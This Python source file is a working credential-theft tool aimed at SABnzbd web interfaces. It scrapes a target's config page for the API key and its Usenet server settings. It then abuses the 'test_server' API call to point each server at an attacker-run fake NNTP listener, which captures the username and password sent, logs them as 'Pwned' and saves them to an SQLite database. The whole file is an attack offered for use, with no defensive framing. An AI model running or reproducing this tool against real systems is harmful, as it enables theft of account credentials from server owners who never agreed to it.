import re
import socket
import sqlite3
import threading
from collections import defaultdict
from json import JSONDecodeError

import requests
from aiohttp import web


# Local Hostname and Port to bind the psuedo NNTP TCP server
NNTP_SERVER_LOCAL_HOST = ""    # "" = listen on all available interfaces
NNTP_SERVER_PUBLIC_HOST = ""   # Your Server or PC's Public IP, or some host that resolves to it
NNTP_SERVER_LOCAL_PORT = 8119  # 119=non-SSL + 8... = 8119, easier to remember

# Local Hostname and Port to bind the Web Server
AIOHTTP_SERVER_HOST = "0.0.0.0"
AIOHTTP_SERVER_PORT = 8112  # shouldn't be the same as the NNTP server

# SQLite Database to store results
# You must make the `credentials` table yourself
con = sqlite3.connect("credentials.db")

SESSION = requests.Session()
SESSION.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Accept-Language": "en-US,en;q=0.5",
    "X-Requested-With": "XMLHttpRequest"
})

routes = web.RouteTableDef()
credentials = defaultdict(list)


def start_nntp_server(host: str, port: int) -> None:
    """
    Host a basic TCP server that acts as a pseudo NNTP server.
    It's set up just enough to ask for authentication.
    It then just logs the received credentials.

    Note: This psuedo NNTP server does not support SSL.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(99)

    print(f"Listening on {host}:{port}")
    print("Ready for incoming connections.")
    print("Note: A client may send each command on new connections, for some reason")

    while True:
        username = None
        password = None

        conn, addr = s.accept()
        with conn:
            # == Greeting: 200 Service available, posting allowed == #
            print(f"[+] [NNTP] Greeting client {addr}")
            conn.send(b"200")  # Service available, posting allowed, See rfc3977 5.1.
            print(f"[+] [NNTP] Waiting for command {addr}")
            try:
                command = conn.recv(1024).decode("utf8").strip()
                if not command:
                    # why this happens I'm not sure
                    print("  ∟ [NNTP] Client disconnected after greeting, may respond in another connection...")
                    continue
            except UnicodeDecodeError:
                print(f"  ∟ [NNTP] Can't decode response from {addr} - You likely have SSL checkbox ticked, untick it.")
                continue

            print(f"[+] [NNTP] Command: {command}")
            if command.lower().startswith("authinfo user"):
                username = command.split(" ")[-1]
                print(f"  ∟ [NNTP] Username: {username}")
            elif command.lower().startswith("authinfo pass"):
                password = command.split(" ")[-1]
                print(f"  ∟ [NNTP] Password: {password}")
            else:
                print("  ∟ [NNTP] Unrecognized command, we likely don't care about it...")
                continue  # just ditch the connection and move on

            # == Response: 381 Password Required == #
            print(f"[+] [NNTP] Asking for AUTHINFO USER from client {addr}")
            conn.send(b"381")  # Password required, See rfc4643 2.3.1.
            print(f"[+] [NNTP] Waiting for command {addr}")
            try:
                command = conn.recv(1024).decode("utf8").strip()
                if not command:
                    print("  ∟ [NNTP] Client disconnected after asking for authinfo user, may respond in another connection...")
                    continue
            except UnicodeDecodeError:
                print(f"  ∟ [NNTP] Can't decode response from {addr} - Did it try to use TLS?")
                continue

            print(f"[+] [NNTP] Command: {command}")
            if command.lower().startswith("authinfo user"):
                username = command.split(" ")[-1]
                print(f"  ∟ [NNTP] Username: {username}")
            elif command.lower().startswith("authinfo pass"):
                password = command.split(" ")[-1]
                print(f"  ∟ [NNTP] Password: {password}")
            else:
                print("  ∟ [NNTP] Unrecognized command, we likely don't care about it...")
                continue  # just ditch the connection and move on

            print(f"[+] [NNTP] Pwned {addr}")
            print(f"  ∟ Username: {username}")
            print(f"  ∟ Password: {password}")

            credentials[addr[0]].append({
                "username": username,
                "password": password
            })


@routes.get("/")
async def root(_) -> web.Response:
    return web.json_response({
        "status": 200,
        "message": "Pong!"
    })


@routes.get("/{target:.*}")
async def exploit(request: web.Request) -> web.Response:
    target = request.match_info["target"]

    # remove http(s):// and any path from the url
    target = target\
        .split("://", maxsplit=1)[-1]\
        .split("/", maxsplit=1)[0]

    # browsers being annoying
    if target == "favicon.ico":
        return web.json_response({
            "status": 401,
            "message": "Not a target/not a portal location."
        })

    print(f"[+] Targeting {target}")

    credentials[target.split(":")[0]].clear()

    try:
        server_settings = SESSION.get(
            url=f"http://{target}/config/server/",
            headers={
                "Accept": "*/*",
                "Referer": f"http://{target}/config/server/",
                "Origin": f"http://{target}"
            }
        )
    except requests.ConnectionError as e:
        print(f"[-] Connection Error to Server Config Page, {e}")
        return web.json_response({
            "status": 500,
            "message": f"Failed to get Server Config page due to a Connection Error. Is the Server online?",
            "error": str(e)
        })

    if not server_settings.ok:
        print(f"[-] Server Config Page returned an error, {server_settings.status_code}")
        return web.json_response({
            "status": 500,
            "message": f"Failed to get Server Config page, {server_settings.status_code}."
        })

    api_key = re.search(r'"apikey" value="([a-f0-9]{32})"', server_settings.text)  # 3.x
    if not api_key:
        api_key = re.search(r'&apikey=([a-f0-9]{32})', server_settings.text)  # 2.x
    if not api_key:
        print("[-] Couldn't find the SABnzbd API key")
        return web.json_response({
            "status": 500,
            "message": "Couldn't find the SABnzbd API key from the Config page."
        })
    api_key = api_key.group(1)

    server_hosts = re.findall(r'name="host" id="host\d+" value="([^"]+)"', server_settings.text)
    if not server_hosts:
        print("[-] No configured servers were found on this SABnzbd instance")
        return web.json_response({
            "status": 200,
            "message": "Success, but no configured servers were found on this SABnzbd instance."
        })

    server_descriptions = re.findall(r'"server" value="([^"]+)"', server_settings.text)
    server_usernames = re.findall(r'value="([^"]+)" data-hide="username"', server_settings.text)
    server_ports = re.findall(r'name="port" id="port\d+" value="(\d+)"', server_settings.text)
    server_ssl = re.findall(r'name="ssl" id="ssl\d+" value="\d" (checked="checked")?', server_settings.text)

    if not server_descriptions or not server_usernames or not server_ports or not server_ssl:
        print(f"[-] Failed to get server information")
        return web.json_response({
            "status": 500,
            "message": "Failed to get server information."
        })

    if len(server_descriptions) != len(server_hosts) or \
            len(server_usernames) != len(server_hosts) or \
            len(server_ports) != len(server_hosts) or \
            len(server_ssl) != len(server_hosts):
        print(f"[-] Failed to get all server information for each host")
        return web.json_response({
            "status": 500,
            "message": "Failed to get all server information for each host."
        })

    servers = [
        {
            "host": server_hosts[i],
            "description": server_descriptions[i],
            "username": server_usernames[i],
            "port": server_ports[i],
            "ssl": bool(server_ssl[i])
        }
        for i in range(len(server_hosts))
    ]

    for server in servers:
        print(f"[+] Exploiting {server}")

        def test_server(host: str, port: int) -> tuple[bool, str]:
            res = requests.post(
                url=f"http://{target}/api",
                params=dict(
                    **{
                        "mode": "config",
                        "name": "test_server",
                        "apikey": api_key,
                        "session": api_key,
                        "output": "json",
                        "server": server["description"],
                        "ajax": "1",
                        server["description"]: "1",
                        "enable": "1",
                        "displayname": server["description"],
                        "host": host,
                        "port": str(port),
                        "username": server["username"],
                        "password": "**********",
                        "connections": "1",
                        "priority": "0",
                        "retention": "0",
                        "timeout": "20",
                        "ssl_verify": "0",
                        "ssl_ciphers": "",
                        "expire_date": "",
                        "quota": "",
                        "notes": ""
                    },
                    **[{}, {"ssl": "1"}][server["ssl"]]
                ),
                headers={
                    "Accept": "*/*",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Referer": f"http://{target}/config/server/"
                }
            )

            try:
                res = res.json()
                return res["value"]["result"], res["value"]["message"]
            except JSONDecodeError:
                # severe error
                return False, res.text

        original_port = int(server["port"])
        ports_to_try = [original_port, 563, 119]
        current_test = 0
        skip_server = True
        while current_test < 3:
            current_port = ports_to_try[current_test]
            if current_test == 0 or current_port != original_port:
                pre_test, pre_test_msg = test_server(server["host"], current_port)
                if pre_test:
                    print(f"[+] Connection successful to {server['host']}:{current_port}")
                    server["port"] = current_port
                    skip_server = False
                    break
                elif pre_test_msg in ("Authentication failed, check username/password.", "502 Authentication Failed"):
                    print("[-] The username and password is invalid, skipping...")
                    break
                else:
                    print(f"[-] Connection failed to {server['host']}:{current_port}\n    {pre_test_msg}")
                    current_test += 1

        if skip_server:
            continue

        server_ssl_bak = server["ssl"]
        server["ssl"] = False  # required for trigger
        trigger_call, _ = test_server(NNTP_SERVER_PUBLIC_HOST, NNTP_SERVER_LOCAL_PORT)
        server["ssl"] = server_ssl_bak

        credentials[target.split(":")[0]][-1].update(server)

        cursor = con.cursor()
        try:
            cursor.execute(
                "INSERT INTO `credentials` (host, port, username, password, ssl) VALUES (?, ?, ?, ?, ?)",
                (
                    server["host"],
                    server["port"],
                    server["username"],
                    credentials[target.split(":")[0]][-1]["password"],
                    server["ssl"]
                )
            )
            con.commit()
        except sqlite3.IntegrityError as e:
            if "UNIQUE constraint failed" not in str(e):
                raise
        cursor.close()

    return web.json_response({
        "status": 200,
        "message": "Success",
        "target": target,
        "credentials": credentials[target.split(":")[0]]
    })


def main():
    try:
        thread = threading.Thread(target=start_nntp_server, args=(NNTP_SERVER_LOCAL_HOST, NNTP_SERVER_LOCAL_PORT))
        thread.start()

        app = web.Application()
        app.add_routes(routes)

        web.run_app(app, host=AIOHTTP_SERVER_HOST, port=AIOHTTP_SERVER_PORT)
    finally:
        con.commit()


if __name__ == "__main__":
    main()
